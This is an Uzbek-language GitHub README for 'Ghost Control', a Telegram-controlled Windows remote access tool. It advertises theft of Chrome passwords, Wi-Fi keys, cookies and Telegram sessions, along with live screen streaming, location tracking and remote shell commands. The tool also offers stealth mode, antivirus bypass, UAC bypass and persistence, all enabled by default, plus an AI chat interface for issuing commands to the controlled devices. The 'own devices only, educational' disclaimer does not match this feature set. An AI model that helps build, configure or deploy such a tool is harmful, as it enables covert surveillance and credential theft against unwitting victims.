# 👻 Ghost Control Client v3.0.3

<div align="center">

![Ghost Control](https://img.shields.io/badge/Ghost-Control-blueviolet?style=for-the-badge&logo=ghost)
![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-3.0.3-success?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-yellow?style=for-the-badge)

**🚀 Telegram orqali kompyuterni masofadan boshqarish tizimi**

[🔧 O'rnatish](#-ornatish) • [📖 Foydalanish](#-foydalanish) • [⚙️ Sozlamalar](#️-sozlamalar) • [📝 Changelog](#-versiya-tarixi)

</div>

---

## ✨ Asosiy Imkoniyatlar

<table>
<tr>
<td width="50%">

### 🖥️ Tizim Boshqaruvi
- 📸 **Ekran rasmi** - bir tugma bilan
- 🎥 **Jonli efir** - real-time ekran stream
- 📂 **Fayl menejeri** - to'liq boshqaruv
- 💻 **CMD/PowerShell** - buyruqlarni bajarish
- 🔊 **Ovoz boshqaruvi** - mute/unmute/volume
- 🔒 **Qulflash/O'chirish** - masofadan boshqarish
- 📍 **Joylashuv** - aniq koordinatalar

</td>
<td width="50%">

### 🔐 Ma'lumotlar To'plash
- 🔑 **Chrome parollar** - saqlangan loginlar
- 📶 **Wi-Fi parollar** - barcha tarmoqlar
- 🍪 **Cookie'lar** - sessiya ma'lumotlari
- � **Telegram tdata** - sessiya eksport
- 🌐 **Brauzer tarixi** - tashrif buyurgan saytlar

</td>
</tr>
<tr>
<td width="50%">

### 🤖 AI Yordamchi (YANGI!)
- 🧠 **OpenRouter AI** - Gemini 2.0 bepul
- 🔄 **Fallback modellar** - 4 ta bepul model
- 💬 **Tabiiy suhbat** - oddiy yozing
- ❓ **Xato tushuntirish** - AI yordam beradi
- 🎯 **Aqlli buyruqlar** - AI tushunadi

</td>
<td width="50%">

### 🛡️ Xavfsizlik & Yashirinlik
- 🔰 **Stealth rejim** - ko'rinmas ishlash
- 🛡️ **AV bypass** - antivirusdan o'tish
- 🚀 **UAC bypass** - admin huquqlar
- 📦 **Persistence** - avtoyuklash
- 🔄 **Auto-update** - GitHub orqali

</td>
</tr>
</table>

---

## 📋 Tizim Talablari

| Komponent | Talab |
|-----------|-------|
| 💻 OS | Windows 10/11 (64-bit) |
| 🐍 Python | 3.8 yoki yuqori |
| 🌐 Internet | Doimiy ulanish |
| 📱 Telegram | Bot token + Admin ID |

---

## 🚀 O'rnatish

### 1️⃣ Reponi klonlash
```bash
git clone https://github.com/Muxammadaziz-boss/User_controller_bot.git
cd User_controller_bot
```

### 2️⃣ Virtual environment
```bash
python -m venv .venv
.venv\Scripts\activate
```

### 3️⃣ Kutubxonalarni o'rnatish
```bash
pip install -r requirements.txt
```

### 4️⃣ Sozlash
`.env` faylini yarating:
```env
# Telegram API (https://my.telegram.org dan oling)
API_ID=your_api_id
API_HASH=your_api_hash
BOT_TOKEN=your_bot_token
ADMIN_ID=your_telegram_id

# AI (https://openrouter.ai dan oling)
OPENROUTER_API_KEY=your_openrouter_key

# GitHub (auto-update uchun)
GITHUB_TOKEN=your_github_token
```

### 5️⃣ Ishga tushirish
```bash
# Client (qurilmada)
python main.py

# Server (serverda yoki PythonAnywhere)
python server/bot.py
```

---

## 📦 EXE Yaratish

```bash
# Build skriptni ishga tushirish
build_system.bat
```

Natija: `system\system.exe` - yashirin rejimda ishlaydigan EXE

---

## 📁 Loyiha Tuzilishi

```
v3.0.3/
├── 📄 main.py              # Client - qurilmada ishlaydi
├── 📄 config.py            # Barcha sozlamalar
├── 📄 handlers.py          # Telegram handlerlar
├── 📄 utils.py             # Yordamchi funksiyalar
├── 📄 persistence.py       # Avtoyuklash moduli
├── 📄 uac_bypass.py        # Admin huquqlar
├── 📄 antivirus_evasion.py # AV himoya
├── 📄 ai_helper.py         # AI moduli
├── 📄 build_system.bat     # EXE yaratish
├── 📄 requirements.txt     # Kutubxonalar
├── 📄 .env                 # 🔒 API kalitlar (GITIGNORE!)
│
└── 📁 server/              # Server qismi
    ├── 📄 bot.py           # Asosiy server bot
    ├── 📄 config.py        # Server sozlamalari
    ├── 📄 database.py      # SQLite database
    ├── 📄 device_manager.py# Qurilmalar ro'yxati
    ├── 📄 ai_helper.py     # AI (fallback bilan)
    └── 📄 panels.py        # Telegram UI panellar
```

---

## 🎮 Foydalanish

### 📱 Telegram Bot Buyruqlari

| Buyruq | Tavsif | Misol |
|--------|--------|-------|
| `/start` | 🏠 Asosiy menyu | `/start` |
| `/screen` | 📸 Ekran rasmi | `/screen` |
| `/live` | 🎥 Jonli efir | `/live` |
| `/cmd` | 💻 CMD buyruq | `/cmd ipconfig` |
| `/ps` | ⚡ PowerShell | `/ps Get-Process` |
| `/location` | 📍 Joylashuv | `/location` |
| `/wifi` | 📶 Wi-Fi parollar | `/wifi` |
| `/passwords` | 🔑 Chrome parollar | `/passwords` |
| `/devices` | 📱 Qurilmalar | `/devices` |
| `/ai` | 🤖 AI sozlamalari | `/ai` |

### 💬 AI bilan Suhbat

Oddiy matn yozing - AI tushunadi!

```
Siz: "1-qurilmadan screenshot ol"
Bot: 📸 Screenshot olinmoqda...

Siz: "Barcha qurilmalarni ko'rsat"
Bot: 📱 3 ta qurilma topildi...

Siz: "Bu xato nimani anglatadi: ConnectionError"
Bot: 🤖 Bu xato internet ulanishi muammosini bildiradi...
```

---

## ⚙️ Sozlamalar

### 🔧 config.py

| Sozlama | Tavsif | Default |
|---------|--------|---------|
| `STEALTH_ENABLED` | Yashirin rejim | `True` |
| `PERSISTENCE_ENABLED` | Avtoyuklash | `True` |
| `ANTIVIRUS_EVASION` | AV bypass | `True` |
| `AI_ENABLED` | AI yordamchi | `True` |
| `USE_OPENROUTER` | OpenRouter ishlatish | `True` |
| `DEBUG_MODE` | Debug rejim | `False` |
| `AUTO_UPDATE_ENABLED` | GitHub yangilanish | `True` |

---

## � Versiya Tarixi

### 🆕 v3.0.3 (2026-01-13)
- ✅ **AI xatosi tuzatildi** - "Failed to generate response" muammosi hal qilindi
- ✅ **Bot loop tuzatildi** - bot o'ziga javob bermaslik
- ✅ **Fallback modellar** - 4 ta bepul AI model qo'shildi
- ✅ **Yaxshilangan xato xabarlari** - O'zbek tilida

### v3.0.2 (2026-01-12)
- ✅ Persistence moduli qo'shildi
- ✅ Server/Client ajratildi
- ✅ Duplikat registry tuzatildi
- ✅ AV-safe kod

### v3.0.1
- 🤖 AI yordamchi qo'shildi
- 🌐 OpenRouter integratsiya

### v3.0.0
- 🔄 To'liq qayta yozildi
- ⚡ Async arxitektura

---

## ⚠️ Xavfsizlik Eslatmalari

> 🔴 **MUHIM OGOHLANTIRISH:**
> 
> Bu dastur **faqat o'z qurilmalaringizni** boshqarish uchun mo'ljallangan!
> Boshqalarning qurilmalarida ruxsatsiz ishlatish **QONUNGA XILOF** va **jinoiy javobgarlikka** olib keladi!

### 🔒 API Kalitlar Xavfsizligi
- ✅ API kalitlarni `.env` faylda saqlang
- ✅ `.env` faylni `.gitignore`ga qo'shing
- ❌ Hech qachon API kalitlarni public repoga yuklamang
- ❌ Bot tokenni hech kim bilan ulashmang

---

## 🤝 Hissa Qo'shish

Pull requestlar qabul qilinadi! Katta o'zgarishlar uchun avval issue oching.

---

## 📄 Litsenziya

**Faqat ta'lim maqsadlari uchun.** Muallif hech qanday noto'g'ri foydalanish uchun javobgar emas.

---

<div align="center">

## 👨‍💻 Muallif

**Muxammadaziz**

[![Telegram](https://img.shields.io/badge/Telegram-@Dr4ax1l-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/Dr4ax1l)
[![GitHub](https://img.shields.io/badge/GitHub-Muxammadaziz--boss-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Muxammadaziz-boss)

---

⭐ **Agar loyiha yoqsa, yulduzcha qo'ying!** ⭐

</div>
